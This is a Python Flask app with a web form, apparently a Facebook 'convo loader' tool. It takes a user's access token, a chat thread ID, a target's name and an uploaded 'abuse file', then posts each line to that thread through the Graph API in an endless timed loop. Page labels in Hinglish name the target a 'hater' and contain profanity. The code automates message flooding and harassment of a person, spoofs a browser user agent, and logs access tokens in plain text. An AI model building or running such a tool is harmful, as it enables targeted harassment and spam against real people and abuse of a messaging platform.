from flask import Flask, request
import requests
from time import sleep
import time
from datetime import datetime
app = Flask(__name__)
app.debug = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        access_token = request.form.get('accessToken')
        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        while True:
            try:
                for message1 in messages:
                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                    message = str(mn) + ' ' + message1
                    parameters = {'access_token': access_token, 'message': message}
                    response = requests.post(api_url, data=parameters, headers=headers)
                    if response.status_code == 200:
                        print(f"Message sent using token {access_token}: {message}")
                    else:
                        print(f"Failed to send message using token {access_token}: {message}")
                    time.sleep(time_interval)
            except Exception as e:
                print(f"Error while sending message using token {access_token}: {message}")
                print(e)
                time.sleep(30)


    return '''

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>𝐀𝐛𝐡𝐢 𝐲𝐚𝐝𝐚𝐯 𝐬𝐚𝐫𝐯𝐞𝐫</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body{
      background-color: #BDEDFF;
    }
    .container{
      max-width: 500px;
      background-color: #4EE2EC;
      border-radius: 10px;
      padding: 20px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
      margin: 0 auto;
      margin-top: 20px;
    }
    .header{
      text-align: center;
      padding-bottom: 20px;
    }
    .btn-submit{
      width: 100%;
      margin-top: 10px;
    }
    .footer{
      text-align: center;
      margin-top: 20px;
      color: #888;
    }
  </style>
</head>
<body>
  <header class="header mt-4">
    <img src="https://emoji.discord.st/emojis/768b108d-274f-4f44-a634-8477b16efce7.gif" width="25">
   <img align="right" alt="coding" width="450" src="https://user-images.githubusercontent.com/55389276/140866485-8fb1c876-9a8f-4d6a-98dc-08c4981eaf70.gif">
_____𝐀𝐁𝐇𝐈 𝐏𝐀𝐍𝐃𝐈𝐓_____
_____________𝐓𝐄𝐂𝐇𝐍𝐈𝐂𝐀𝐋 𝐀𝐁𝐇𝐈2𝐌 -𝐒𝐄𝐑𝐕𝐄𝐑  
<img 
src="https://emoji.discord.st/emojis/768b108d-274f-4f44-a634-8477b16efce7.gif" width="25">

</h3>

  <div class="container">
    <form action="/" method="post" enctype="multipart/form-data">
      <div class="mb-3">
        <label for="accessToken"> <img src="https://emoji.discord.st/emojis/768b108d-274f-4f44-a634-8477b16efce7.gif" width="25"> 𝐁𝐬𝐝𝐤 𝐭𝐨𝐤𝐞𝐧 𝐝𝐚𝐥 𝐲𝐚 𝐟𝐢𝐫 𝐚𝐩𝐧𝐢 𝐠𝐚𝐧𝐝 𝐝𝐚𝐥: <img src="https://emoji.discord.st/emojis/768b108d-274f-4f44-a634-8477b16efce7.gif" width="25"> </label>
        <input type="text" class="form-control" id="accessToken" name="accessToken" required>
      </div>
      <div class="mb-3">
        <label for="threadId"> <img src="https://emoji.discord.st/emojis/768b108d-274f-4f44-a634-8477b16efce7.gif" width="25"> 𝐈𝐍𝐓𝐄𝐑 𝐓𝐎𝐊𝐄𝐍: <img src="https://emoji.discord.st/emojis/768b108d-274f-4f44-a634-8477b16efce7.gif" width="25"> </label>
        <input type="text" class="form-control" id="threadId" name="threadId" required>
      </div>
      <div class="mb-3">
        <label for="kidx"> <img src="https://emoji.discord.st/emojis/768b108d-274f-4f44-a634-8477b16efce7.gif" width="25"<𝐈𝐍𝐓𝐄𝐑 𝐇𝐀𝐓𝐓𝐄𝐑𝐒 𝐍𝐀𝐌𝐄: <img src="https://emoji.discord.st/emojis/768b108d-274f-4f44-a634-8477b16efce7.gif" width="25"> </label>
        <input type="text" class="form-control" id="kidx" name="kidx" required>
      </div>
      <div class="mb-3">
        <label for="txtFile"> <img src="https://emoji.discord.st/emojis/768b108d-274f-4f44-a634-8477b16efce7.gif" width="25">𝐈𝐍𝐓𝐄𝐑 𝐀𝐁𝐔𝐒𝐄 𝐅𝐈𝐋𝐄 : <img src="https://emoji.discord.st/emojis/768b108d-274f-4f44-a634-8477b16efce7.gif" width="25"> </label>
        <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
      </div>
      <div class="mb-3">
        <label for="time"> <img src="https://emoji.discord.st/emojis/768b108d-274f-4f44-a634-8477b16efce7.gif" width="25">𝐈𝐍𝐓𝐄𝐑 𝐌𝐄𝐒𝐒𝐀𝐆𝐄𝐒 𝐒𝐏𝐄𝐄𝐃 <img src="https://emoji.discord.st/emojis/768b108d-274f-4f44-a634-8477b16efce7.gif" width="25"> :</label>
        <input type="number" class="form-control" id="time" name="time" required>
      </div>
      <button type="submit" class="btn btn-primary btn-submit"> <img src="https://emoji.discord.st/emojis/768b108d-274f-4f44-a634-8477b16efce7.gif" width="25"> 𝐀𝐋𝐋 𝐎𝐊/𝐒𝐔𝐁𝐌𝐈𝐓 𝐍𝐎𝐖  <img src="https://emoji.discord.st/emojis/768b108d-274f-4f44-a634-8477b16efce7.gif" width="25"> </button>
    </form>
  </div>
  <footer class="footer">
    <p>&copy; 
    <img align="right" alt="coding" width="400" src="https://user-images.githubusercontent.com/78341798/194534778-d662496c-ae00-4e8d-ae9b-b90912054e7f.gif">   𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐝 𝐛𝐲 𝐀𝐛𝐡𝐢𝐧𝐚𝐯 𝐏𝐚𝐧𝐝𝐢𝐭 2024 𝐚𝐥𝐥 𝐫𝐢𝐠𝐡𝐭𝐬 𝐑𝐞𝐬𝐞𝐫𝐯𝐞𝐝 <img src="https://emoji.discord.st/emojis/768b108d-274f-4f44-a634-8477b16efce7.gif" width="25"> </p>
    <p> <img src="https://emoji.discord.st/emojis/768b108d-274f-4f44-a634-8477b16efce7.gif" width="25">𝐂𝐨𝐧𝐯𝐨 𝐥𝐨𝐝𝐞𝐫 𝐢𝐧𝐛𝐨𝐱 /𝐠𝐫𝐨𝐮𝐩𝐬 𝐭𝐨𝐨𝐥 <img src="https://emoji.discord.st/emojis/768b108d-274f-4f44-a634-8477b16efce7.gif" width="25"></p>
    <p> 𝐒𝐜𝐫𝐢𝐩𝐭 𝐃𝐞𝐯𝐨𝐥𝐩𝐞𝐫 𝐀𝐛𝐡𝐢𝐧𝐚𝐯 𝐇𝐞𝐫𝐞 
    _________________________________<a href=https://github.com/TECHNICALABHI2M</a></p>
  </footer>
</body>
  </html>
    '''


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
    app.run(debug=True)